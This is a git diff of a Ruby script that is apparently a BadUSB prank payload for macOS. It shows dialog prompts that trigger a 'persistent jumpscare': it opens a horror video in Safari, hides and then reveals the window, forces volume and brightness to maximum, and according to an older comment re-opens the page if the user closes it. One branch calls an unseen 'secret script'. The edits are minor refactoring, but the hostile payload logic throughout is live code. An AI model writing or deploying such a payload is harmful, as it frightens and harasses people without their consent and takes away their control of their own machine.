@@ -82,7 +82,7 @@ def create_jumpscare_html(video_url)
 end
 
 # --- Persistent Jumpscare Mode ---
-# Opens the jumpscare page in Safari and continuously checks to re-open it if the user closes it.
+# Opens the jumpscare page in Safari and continually checks if the page is open.
 def persistent_jumpscare(video_url)
   html_file = create_jumpscare_html(video_url)
   
@@ -90,9 +90,9 @@ def persistent_jumpscare(video_url)
     set_volume_to_max
     # Open the jumpscare page in Safari.
     system("open -a Safari '#{html_file}'")
-    # Immediately hide Safari's front window.
+    # Hide Safari's front window.
     system("osascript -e 'tell application \"Safari\" to set visible of front window to false'")
-    # Wait 0.75 seconds (0.5 + 0.25 extra) before showing.
+    # Wait 0.75 seconds (0.5 + 0.25 extra).
     sleep 0.75
     # Set brightness to maximum.
     set_brightness_to_max
@@ -124,15 +124,17 @@ def run_secret_script
 end
 
 # --- Main Program Flow ---
-# Prompt for subscription status.
+
+# First prompt: "Are you subscribed to MrWoooper?"
 subscribed = display_dialog("Are you subscribed to MrWoooper?", ["Yes", "No"], "Yes")
+puts "DEBUG: First prompt answer: #{subscribed.inspect}"  # Debug output
 if subscribed.nil?
   puts "No response received. Exiting."
   exit 0
 end
 
-if subscribed.downcase == "no"
-  # Non-subscriber branch: Immediately trigger jumpscare with jumpscare2.mp4.
+if subscribed.strip.downcase == "no"
+  # Non-subscriber branch.
   sleep 1
   video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
   persistent_jumpscare(video_url)
@@ -143,14 +145,15 @@ else
     puts "No button chosen. Exiting."
     exit 0
   end
-  ch = button_choice.strip.downcase
-  if ch == "hawk"
+  button_choice = button_choice.strip.downcase
+  case button_choice
+  when "hawk"
     run_secret_script
-  elsif ch == "tuah"
+  when "tuah"
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4")
-  elsif ch == "sydney lover"
+  when "sydney lover"
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/andrewjumpv2.mp4")
-  elsif ch.include?("girl power")
+  when /girl\s*power/
     persistent_jumpscare("https://raw.githubusercontent.com/Hrampell/badusb_v2/main/momojumpscare.mp4")
   else
     puts "Unexpected button choice: #{button_choice}"
